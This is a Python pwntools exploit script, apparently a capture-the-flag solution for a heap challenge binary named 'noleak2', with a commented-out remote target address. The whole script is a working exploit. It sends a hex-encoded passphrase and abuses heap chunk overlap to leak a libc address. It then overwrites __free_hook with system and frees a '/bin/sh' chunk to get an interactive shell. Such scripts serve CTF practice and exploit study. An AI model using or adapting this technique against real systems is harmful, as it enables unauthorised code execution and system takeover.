from pwn import *

p=process('./noleak2')
#p=remote('47.108.195.119',20182)
context.terminal = ["/usr/bin/tmux","sp","-h"]
context.log_level='debug'
elf=ELF('./noleak2')
libc=ELF('libc.so.6')
#gdb.attach(p,'b *$rebase(0xfc9)')

#p.sendline('n03tAck')
#p.sendline('1u1u')

p.sendlineafter('please input a str:','\x4e\x30\x5f\x70\x79\x5f\x31\x6e\x5f\x74\x48\x65\x5f\x63\x74\x37')

def menu(id):
	p.sendlineafter('>',str(id))

def add(id,size):
	menu(1)
	p.sendlineafter('Index?\n',str(id))
	p.sendlineafter('Size?\n',str(size))

def show(id):
	menu(2)
	p.sendlineafter('Index?\n',str(id))

def edit(id,content):
	menu(3)
	p.sendlineafter('Index?\n',str(id))
	p.sendlineafter('content:\n',str(content))

def delete(id):
	menu(4)
	p.sendlineafter('Index?\n',str(id))



add(0,0x450)
add(1,0x18)
add(2,0x4f0)
add(3,0x18)

delete(0)
gdb.attach(p)
edit(1,'a'*0x10+p64(0x480))
delete(2)

add(0,0x450)
show(1)

leak=u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
malloc_hook=leak+0x7f3223b9bc30-0x7f3223b9bca0
success('malloc_hook:'+hex(malloc_hook))
libc_base=malloc_hook-libc.sym['__malloc_hook']
success('libc_base:'+hex(libc_base))

add(2,0x18)
delete(2)
edit(1,p64(libc_base+libc.sym['__free_hook']))

add(4,0x10)
add(5,0x10)
edit(5,p64(libc_base+libc.sym['system']))

add(6,0x30)
edit(6,'/bin/sh\x00')
delete(6)

#gdb.attach(p)

p.interactive()
